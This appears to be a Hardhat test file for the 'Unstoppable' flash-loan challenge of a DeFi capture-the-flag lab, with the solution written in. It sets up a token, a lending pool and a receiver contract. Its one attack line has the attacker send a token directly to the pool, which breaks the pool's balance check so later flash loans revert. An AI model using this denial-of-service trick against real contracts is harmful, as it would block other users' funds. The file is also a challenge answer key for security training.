const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {

    let owner;
    let attacker;
    let victim;
    let token;
    let pool;
    let receiverContract;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    // attacker has 100 tokens
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async () => {
        [owner, attacker, victim] = await ethers.getSigners();
        token = await ethers.getContractFactory('DamnValuableToken', owner).then(f => f.deploy());
        pool = await ethers.getContractFactory('UnstoppableLender', owner).then(f => f.deploy(token.address));
        receiverContract = await ethers.getContractFactory('ReceiverUnstoppable', victim).then(f => f.deploy(pool.address));

        // deposit some tokens in the pool
        await token.approve(pool.address, TOKENS_IN_POOL);
        await pool.depositTokens(TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        // transfer some tokens to attacker
        await token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
        expect(await token.balanceOf(attacker.address)).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

        // Flasloan is successful because of attacker did not send tokens yet
        await receiverContract.executeFlashLoan(10);
    });

    it('should transfer tokens to pool', async () => {
        token.connect(attacker).transfer(pool.address, ethers.utils.parseEther('1'));
    });

    after(async () => {
        // Executing flashloan should fail because attacker sent some tokens to contract without calling depositToken function
        await expect(receiverContract.executeFlashLoan(10)).to.be.reverted;
    });
});